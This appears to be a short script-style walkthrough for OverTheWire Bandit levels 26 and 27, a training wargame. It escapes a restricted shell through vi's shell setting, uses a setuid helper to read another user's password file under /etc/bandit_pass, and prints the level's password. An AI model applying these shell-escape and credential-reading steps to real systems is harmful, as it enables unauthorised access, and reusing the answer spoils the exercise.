#!/bin/bash

ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
# Inside SSH:
#Decrease the size of terminal
# To get around the restricted shell in `vi`, follow these steps:

# 1. Enter visual mode by holding down "v"
# 2. Type this command (you won't see all of it due to screen size):
:set shell=/bin/bash
# 3. Long press "Esc" to return to normal mode
# 4. Then type:
:shell

# You now have a real shell. Run:
cat /etc/bandit_pass/bandit26

# Get the next password, then:

ssh bandit27@localhost
# Inside SSH:
ls
./bandit27-do cat /etc/bandit_pass/bandit27
# Output: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB

exit
